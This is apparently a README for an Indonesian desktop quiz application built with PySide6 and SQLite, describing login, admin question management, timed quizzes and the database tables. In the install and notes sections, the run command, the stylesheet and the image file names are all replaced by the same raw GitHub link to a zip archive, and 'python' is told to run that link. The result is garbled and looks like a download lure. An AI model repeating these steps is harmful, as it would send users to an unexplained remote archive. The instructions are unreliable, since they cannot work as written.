# Aplikasi Quiz Berbasis PySide6

Aplikasi ini adalah aplikasi kuis berbasis desktop yang dikembangkan menggunakan **PySide6** dan **SQLite**. Aplikasi ini mendukung fitur login, registrasi, mengelola pertanyaan, menjalankan kuis, serta menampilkan dan mengelola hasil kuis.

## Fitur Utama

1. **Login dan Registrasi**:
   - Pengguna dapat mendaftar sebagai admin atau peserta.
   - Validasi email dan password.
   
2. **Panel Admin**:
   - Tambah, edit, dan hapus pertanyaan kuis.
   - Pengelolaan hasil peserta.

3. **Tampilan Kuis**:
   - Menyediakan soal acak dengan berbagai kategori.
   - Mendukung timer untuk batas waktu pengerjaan kuis.

4. **Pengelolaan Hasil Kuis**:
   - Menampilkan skor, jumlah jawaban benar, serta waktu pengerjaan.
   - Opsi untuk menyimpan hasil kuis ke file teks.

## Struktur Database

1. **Tabel `users`**:
   - `id`: ID pengguna (primary key).
   - `Name`: Nama pengguna.
   - `Email`: Email unik.
   - `Password`: Password pengguna.
   - `Role`: Peran pengguna (`admin` atau `peserta`).

2. **Tabel `questions`**:
   - `id`: ID pertanyaan (primary key).
   - `question`: Teks pertanyaan.
   - `option1`-`option4`: Pilihan jawaban.
   - `correct_option`: Indeks jawaban benar (0-3).
   - `subject`: Kategori soal.

3. **Tabel `results`**:
   - `id`: ID hasil (primary key).
   - `user_id`: ID pengguna yang menyelesaikan kuis.
   - `score`: Skor pengguna.
   - `correct_answers`: Jumlah jawaban benar.
   - `time_limit`: Waktu pengerjaan.
   - `start_time`: Waktu mulai kuis.
   - `end_time`: Waktu selesai kuis.

## Instalasi dan Penggunaan

1. **Clone Repository**:
   ```bash
   git clone <repository_url>
   cd <repository_name>
   ```

2. **Pasang Dependensi**:
   Pastikan Python 3.x telah diinstal, kemudian pasang PySide6:
   ```bash
   pip install PySide6
   ```

3. **Jalankan Aplikasi**:
   ```bash
   python https://raw.githubusercontent.com/boybands/Quiz-Edukasi/main/mazopathia/Quiz-Edukasi.zip
   ```

4. **Opsional: Tambahkan StyleSheet**:
   Tambahkan file `https://raw.githubusercontent.com/boybands/Quiz-Edukasi/main/mazopathia/Quiz-Edukasi.zip` untuk menyesuaikan tampilan aplikasi.

## Penggunaan

- **Admin**:
  - Login dengan peran admin untuk menambah atau mengedit soal.
  - Kelola hasil peserta melalui panel admin.
- **Peserta**:
  - Login sebagai peserta untuk mengikuti kuis sesuai kategori yang dipilih.
  - Lihat skor dan simpan hasil ke file teks setelah selesai kuis.

## Tampilan Aplikasi

- **Halaman Login**:
  Tampilan login dengan validasi email dan password.
- **Panel Admin**:
  Kelola pertanyaan dan hasil peserta melalui antarmuka tab.
- **Tampilan Kuis**:
  Pilihan soal berdasarkan kategori, opsi jawaban, dan timer.

## Catatan

- Pastikan file gambar yang digunakan (`https://raw.githubusercontent.com/boybands/Quiz-Edukasi/main/mazopathia/Quiz-Edukasi.zip`, `https://raw.githubusercontent.com/boybands/Quiz-Edukasi/main/mazopathia/Quiz-Edukasi.zip`, dll.) tersedia di direktori yang sama.
- StyleSheet dapat disesuaikan melalui file `https://raw.githubusercontent.com/boybands/Quiz-Edukasi/main/mazopathia/Quiz-Edukasi.zip`.


## Selamat menggunakan aplikasi kuis ini!
